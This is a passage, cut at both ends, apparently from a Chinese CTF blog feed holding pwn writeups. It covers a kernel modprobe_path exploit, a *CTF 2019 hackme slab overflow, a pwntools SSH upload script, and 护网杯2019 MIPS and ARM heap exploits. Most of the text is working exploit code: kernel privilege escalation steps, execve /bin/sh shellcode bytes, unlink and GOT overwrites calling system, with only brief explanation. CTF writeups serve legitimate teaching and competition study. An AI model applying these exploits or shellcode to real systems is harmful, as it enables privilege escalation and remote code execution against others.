system(<span class="string">&quot;cat /home/user/flag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /root/flag /home/user/flag\n/bin/chmod 777 /home/user/flag&#x27; &gt; /home/user/getflag.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/user/getflag.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/user/ll&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/user/ll&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Open hfs device\n&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/hfs&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Create initial channels\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>** payload = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>**)buf;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> modprobe_addr = <span class="number">0xffffffff81a3f7a0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (count = <span class="number">1</span>; count &lt; <span class="number">0x11</span>; count++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (count == <span class="number">5</span>) &#123;</span><br><span class="line">            create_channel(fd, <span class="number">0</span>, <span class="number">0x20</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            create_channel(fd, count, <span class="number">0x20</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    delete_channel(fd, <span class="number">7</span>);</span><br><span class="line">    buf[<span class="number">0x20</span>] = <span class="string">&#x27;\x20&#x27;</span>;</span><br><span class="line">    write_channel(fd, <span class="number">6</span>, buf, <span class="number">0x21</span>);</span><br><span class="line"></span><br><span class="line">    create_channel(fd, <span class="number">0x20</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (count = <span class="number">1</span>; count &lt; <span class="number">5</span>; count++) &#123;</span><br><span class="line">        delete_channel(fd, count);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    payload[<span class="number">0</span>] = <span class="number">0x30</span>;</span><br><span class="line">    payload[<span class="number">1</span>] = modprobe_addr;</span><br><span class="line">    payload[<span class="number">2</span>] = <span class="number">0x100</span>;</span><br><span class="line">    </span><br><span class="line">    write_channel(fd, <span class="number">0x20</span>, payload, <span class="number">0x18</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, <span class="string">&quot;/home/user/getflag.sh&quot;</span>);</span><br><span class="line">    write_channel(fd, <span class="number">0x30</span>, buf, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    trigger();</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	exploit();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="CTF-2019-hackme"><a href="#CTF-2019-hackme" class="headerlink" title="*CTF 2019 hackme"></a>*CTF 2019 hackme</h3><p>比赛调的时候把smap关掉了，结果在开启kaslr+smep的情况下做出来了，但是没绕过smap。</p>
<blockquote>
<p>参考Balsn的exploit：<a href="https://balsn.tw/ctf_writeup/">https://balsn.tw/ctf_writeup/</a></p>
</blockquote>
<p>驱动中的读和写函数存在if检查绕过的情况，使得对slab的读、编辑操作可以向前溢出。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v3 == <span class="number">0x30002</span> )                        <span class="comment">// edit</span></span><br><span class="line">&#123;</span><br><span class="line">  idx = <span class="number">2L</span>L * args;</span><br><span class="line">  chunk_ptr = POOL[idx];</span><br><span class="line">  node_addr = &amp;POOL[idx];</span><br><span class="line">  <span class="keyword">if</span> ( chunk_ptr &amp;&amp; offset + size &lt;= (<span class="keyword">unsigned</span> __int64)node_addr[<span class="number">1</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    copy_from_user(offset + chunk_ptr, buffer, size);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">0x30003</span> )                   <span class="comment">// read</span></span><br><span class="line">&#123;</span><br><span class="line">  idx = <span class="number">2L</span>L * args;</span><br><span class="line">  chunk_ptr = POOL[idx];</span><br><span class="line">  node_addr = &amp;POOL[idx];</span><br><span class="line">  <span class="keyword">if</span> ( chunk_ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( offset + size &lt;= (<span class="keyword">unsigned</span> __int64)node_addr[<span class="number">1</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      copy_to_user(buffer, offset + chunk_ptr, size);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1L</span>L;</span><br></pre></td></tr></table></figure>

<p>首先通过向前读来泄漏slab和内核堆地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">get_heapaddr</span><span class="params">(<span class="keyword">int</span> fd)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x400</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">0x400</span>);</span><br><span class="line">    </span><br><span class="line">    add(fd, <span class="number">0</span>, buf, <span class="number">0x100</span>);</span><br><span class="line">    add(fd, <span class="number">1</span>, buf, <span class="number">0x100</span>);</span><br><span class="line">    add(fd, <span class="number">2</span>, buf, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>(fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">delete</span>(fd, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    show(fd, <span class="number">2</span>, readbuf, <span class="number">0x100</span>, <span class="number">-0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>(fd, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> readbuf[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">get_kerneladdr</span><span class="params">(<span class="keyword">int</span> fd)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x400</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line">    add(fd, <span class="number">0</span>, buf, <span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line">    show(fd, <span class="number">0</span>, readbuf, <span class="number">0xa00</span>, <span class="number">-0xa00</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//size_t i = 0;</span></span><br><span class="line">    <span class="comment">//for (i = 0; i &lt; 0xa00/8; i++)</span></span><br><span class="line">    <span class="comment">//    printf(&quot;%d=%llx\n&quot;, i, readbuf[i]);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">delete</span>(fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> readbuf[<span class="number">25</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h4 id="SMEP开启的情况下"><a href="#SMEP开启的情况下" class="headerlink" title="SMEP开启的情况下"></a>SMEP开启的情况下</h4><h4 id="SMEP-amp-SMAP开启的情况下"><a href="#SMEP-amp-SMAP开启的情况下" class="headerlink" title="SMEP&amp;SMAP开启的情况下"></a>SMEP&amp;SMAP开启的情况下</h4><h3 id="musl-gcc"><a href="#musl-gcc" class="headerlink" title="musl-gcc"></a>musl-gcc</h3><p>从官网下载source code。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ./configure &amp;&amp; sudo make install</span><br><span class="line">sudo cp ./obj/musl-gcc /bin/</span><br><span class="line">musl-gcc --static -Os source.c -o output</span><br></pre></td></tr></table></figure>

<h3 id="Using-SSH-in-pwntools"><a href="#Using-SSH-in-pwntools" class="headerlink" title="Using SSH in pwntools"></a>Using SSH in pwntools</h3><p>马克一下大佬的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;35.221.78.115&quot;</span></span><br><span class="line">PORT =  <span class="number">10022</span></span><br><span class="line"></span><br><span class="line">USER = <span class="string">&quot;pwn&quot;</span></span><br><span class="line">PW = <span class="string">&quot;pwn&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compile</span>():</span></span><br><span class="line">    log.info(<span class="string">&quot;Compile&quot;</span>)</span><br><span class="line">    os.system(<span class="string">&quot;musl-gcc -w -s -static -o3 pwn2.c -o pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_cmd</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    r.sendline(cmd)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;$ &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    p = log.progress(<span class="string">&quot;Upload&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&quot;pwn&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    encoded = base64.b64encode(data)</span><br><span class="line">    </span><br><span class="line">    r.recvuntil(<span class="string">&quot;$ &quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(encoded), <span class="number">300</span>):</span><br><span class="line">        p.status(<span class="string">&quot;%d / %d&quot;</span> % (i, len(encoded)))</span><br><span class="line">        exec_cmd(<span class="string">&quot;echo \&quot;%s\&quot; &gt;&gt; benc&quot;</span> % (encoded[i:i+<span class="number">300</span>]))</span><br><span class="line">        </span><br><span class="line">    exec_cmd(<span class="string">&quot;cat benc | base64 -d &gt; bout&quot;</span>)    </span><br><span class="line">    exec_cmd(<span class="string">&quot;chmod +x bout&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    p.success()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>(<span class="params">r</span>):</span></span><br><span class="line">    compile()</span><br><span class="line">    upload()</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">        session = ssh(USER, HOST, PORT, PW)</span><br><span class="line">        r = session.run(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">        exploit(r)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = process(<span class="string">&quot;./startvm.sh&quot;</span>)</span><br><span class="line">        <span class="keyword">print</span> util.proc.pidof(r)</span><br><span class="line">        pause()</span><br><span class="line">        exploit(r)</span><br></pre></td></tr></table></figure>





<blockquote>
<p>参考资料</p>
<p><a href="https://bbs.pediy.com/thread-226696.htm">https://bbs.pediy.com/thread-226696.htm</a></p>
<p><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/linux-kernel-rop-ropping-your-way-to-part-1/">https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/linux-kernel-rop-ropping-your-way-to-part-1/</a></p>
<p><a href="https://hardenedlinux.github.io/system-security/2016/05/23/kernel_self_protection.html">https://hardenedlinux.github.io/system-security/2016/05/23/kernel_self_protection.html</a></p>
<p><a href="https://blog.packagecloud.io/eng/2016/03/08/how-to-extract-and-disassmble-a-linux-kernel-image-vmlinuz/">https://blog.packagecloud.io/eng/2016/03/08/how-to-extract-and-disassmble-a-linux-kernel-image-vmlinuz/</a></p>
<p><a href="https://xz.aliyun.com/t/2054">https://xz.aliyun.com/t/2054</a></p>
<p><a href="https://kileak.github.io/ctf/2019/xctf-hackme/">https://kileak.github.io/ctf/2019/xctf-hackme/</a></p>
<p><a href="http://p4nda.top/2018/10/11/ciscn-2017-babydriver/">http://p4nda.top/2018/10/11/ciscn-2017-babydriver/</a></p>
<p><a href="https://github.com/pwning/public-writeup/tree/master/0ctf2017/knote">https://github.com/pwning/public-writeup/tree/master/0ctf2017/knote</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>linux</tag>
        <tag>kernel</tag>
        <tag>pwn</tag>
        <tag>smep</tag>
        <tag>smap</tag>
        <tag>ret2usr</tag>
      </tags>
  </entry>
  <entry>
    <title>护网杯2019线下赛 部分Pwn WriteUp</title>
    <url>/2019/10/22/hwb19-final-pwn/</url>
    <content><![CDATA[<p>护网杯2019线下赛部分Pwn WriteUp：1个MIPS和2个ARM的Pwn。</p>
<a id="more"></a>

<h2 id="0x01-mipsio"><a href="#0x01-mipsio" class="headerlink" title="0x01 mipsio"></a>0x01 mipsio</h2><p>程序.bss段上存在random的file结构体，通过数组下标的问题，使得该处被堆地址所覆盖。利用堆块释放时的chain，使得vtable和表中特定函数指向可控地址。利用MIPS没有NX来执行shellcode。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">p, idx, size, ifRandom, content=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, str(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index?\n&#x27;</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size?\n&#x27;</span>, str(size))</span><br><span class="line">    <span class="keyword">if</span> content == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;]\n&#x27;</span>, <span class="string">&#x27;y&#x27;</span>) </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;]\n&#x27;</span>, <span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">        p.sendafter(<span class="string">&#x27;?\n&#x27;</span>, content) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, str(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index?\n&#x27;</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    context.binary = <span class="string">&#x27;./vuln&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">        p = remote(<span class="string">&quot;172.16.9.45&quot;</span>, <span class="number">10427</span>)</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">        p = process([<span class="string">&quot;qemu-mipsel&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/mipsel-linux-gnu/&quot;</span>, <span class="string">&quot;./vuln&quot;</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = process([<span class="string">&quot;qemu-mipsel&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/mipsel-linux-gnu/&quot;</span>, <span class="string">&quot;./vuln&quot;</span>])</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    delete(p, <span class="number">-8</span>)</span><br><span class="line"></span><br><span class="line">    add(p, <span class="number">0x80000000</span>, <span class="number">0x90</span>, <span class="number">0</span>, p32(<span class="number">0xfbad8000</span>)) <span class="comment">#0xfbad848b</span></span><br><span class="line"></span><br><span class="line">    add(p, <span class="number">0</span>, <span class="number">0x10</span>, <span class="number">0</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(p, <span class="number">1</span>, <span class="number">0x10</span>, <span class="number">0</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    delete(p, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    delete(p, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;\x28&#x27;</span></span><br><span class="line">    add(p, <span class="number">2</span>, <span class="number">0x10</span>, <span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">    add(p, <span class="number">3</span>, <span class="number">0x10</span>, <span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">    add(p, <span class="number">4</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(p, <span class="number">5</span>, <span class="number">0x20</span>, <span class="number">0</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line">    add(p, <span class="number">6</span>, <span class="number">0x20</span>, <span class="number">0</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    delete(p, <span class="number">6</span>)</span><br><span class="line">    delete(p, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    buf =  <span class="string">&quot;&quot;</span></span><br><span class="line">    buf += <span class="string">&quot;\x66\x06\x06\x24\xff\xff\xd0\x04\xff\xff\x06\x28\xe0&quot;</span></span><br><span class="line">    buf += <span class="string">&quot;\xff\xbd\x27\x01\x10\xe4\x27\x1f\xf0\x84\x24\xe8\xff&quot;</span></span><br><span class="line">    buf += <span class="string">&quot;\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x27\xab\x0f\x02&quot;</span></span><br><span class="line">    buf += <span class="string">&quot;\x24\x0c\x01\x01\x01\x2f\x62\x69\x6e\x2f\x73\x68\x00&quot;</span></span><br><span class="line"></span><br><span class="line">    add(p, <span class="number">7</span>, <span class="number">0x20</span>, <span class="number">0</span>, <span class="string">&#x27;\x98&#x27;</span>)</span><br><span class="line">    add(p, <span class="number">8</span>, <span class="number">0x20</span>, <span class="number">0</span>, <span class="string">&#x27;sunichi&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    delete(p, <span class="number">8</span>)</span><br><span class="line">    add(p, <span class="number">9</span>, <span class="number">0x100</span>, <span class="number">0</span>, buf)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#flag&#123;0c48137a-3c39-4fa7-a73c-795aa2e8f71f&#125;</span></span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>

<h2 id="0x02-arm-unlink"><a href="#0x02-arm-unlink" class="headerlink" title="0x02 arm-unlink"></a>0x02 arm-unlink</h2><p>就是一个常规的unlink，只不过在arm架构下。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">p, size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, str(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, str(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">p, idx, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, str(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    context.binary = <span class="string">&#x27;./vuln&#x27;</span></span><br><span class="line">    elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">        p = remote(<span class="string">&quot;172.16.9.45&quot;</span>, <span class="number">10623</span>)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">        p = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabihf&quot;</span>, <span class="string">&quot;./vuln&quot;</span>])</span><br><span class="line">        libc = ELF(<span class="string">&#x27;/usr/arm-linux-gnueabihf/lib/libc.so.6&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabihf&quot;</span>, <span class="string">&quot;./vuln&quot;</span>])</span><br><span class="line">        libc = ELF(<span class="string">&#x27;/usr/arm-linux-gnueabihf/lib/libc.so.6&#x27;</span>)</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    add(p, <span class="number">0x84</span>) <span class="comment">#0</span></span><br><span class="line">    add(p, <span class="number">0xe4</span>) <span class="comment">#1</span></span><br><span class="line">    add(p, <span class="number">0xe4</span>) <span class="comment">#2</span></span><br><span class="line">    add(p, <span class="number">0x84</span>) <span class="comment">#3</span></span><br><span class="line">    add(p, <span class="number">0x84</span>) <span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">    edit(p, <span class="number">2</span>, p32(<span class="number">0</span>) * <span class="number">4</span> + p32(<span class="number">0x100</span>) + p32(<span class="number">0xd0</span>))</span><br><span class="line"></span><br><span class="line">    delete(p, <span class="number">1</span>) <span class="comment">#-1</span></span><br><span class="line">    delete(p, <span class="number">2</span>) <span class="comment">#-2</span></span><br><span class="line">    edit(p, <span class="number">0</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x84</span>)</span><br><span class="line"></span><br><span class="line">    add(p, <span class="number">0x40</span>) <span class="comment">#1</span></span><br><span class="line">    add(p, <span class="number">0x64</span>) <span class="comment">#2</span></span><br><span class="line">    add(p, <span class="number">0x40</span>) <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">    delete(p, <span class="number">1</span>) <span class="comment">#-1</span></span><br><span class="line">    delete(p, <span class="number">3</span>) <span class="comment">#-3</span></span><br><span class="line"></span><br><span class="line">    add(p, <span class="number">0x50</span>) <span class="comment">#1</span></span><br><span class="line">    add(p, <span class="number">0x40</span>) <span class="comment">#3</span></span><br><span class="line">    add(p, <span class="number">0x50</span>) <span class="comment">#6</span></span><br><span class="line">    add(p, <span class="number">0x50</span>) <span class="comment">#7</span></span><br><span class="line"></span><br><span class="line">    payload = p32(<span class="number">0</span>) + p32(<span class="number">0x51</span>) + p32(<span class="number">0x2106c</span> + <span class="number">8</span> - <span class="number">12</span>) + p32(<span class="number">0x2106c</span> + <span class="number">8</span> - <span class="number">8</span>) + p32(<span class="number">0</span>) * <span class="number">16</span> + p32(<span class="number">0x50</span>) + p32(<span class="number">0x58</span>)[:<span class="number">2</span>]</span><br><span class="line">    edit(p, <span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">    delete(p, <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">    edit(p, <span class="number">2</span>, p32(<span class="number">0</span>) + p32(elf.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line">    edit(p, <span class="number">0</span>, p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">    delete(p, <span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    recv = p.recv(<span class="number">4</span>)</span><br><span class="line">    libc.address = u32(recv) - <span class="number">88</span>/<span class="number">2</span> - <span class="number">0x18</span> - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x470</span></span><br><span class="line"></span><br><span class="line">    edit(p, <span class="number">0</span>, p32(libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    edit(p, <span class="number">3</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    delete(p, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#flag&#123;95633964-1915-4d63-9164-8b6b153ffe3b&#125;</span></span><br><span class="line">    <span class="keyword">print</span> hex(libc.address)</span><br><span class="line">    p.interactive()</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>

<h2 id="0x03-bookmanager"><a href="#0x03-bookmanager" class="headerlink" title="0x03 bookmanager"></a>0x03 bookmanager</h2><p>同样需要利用unlink，只不过步骤比之前那题麻烦很多。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">p, name, size, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, str(<span class="number">1</span>))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;book name?\n&#x27;</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;?\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">p, idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, str(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">p, idx, name, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, str(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;\n&#x27;</span>, name)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;\n&#x27;</span>, 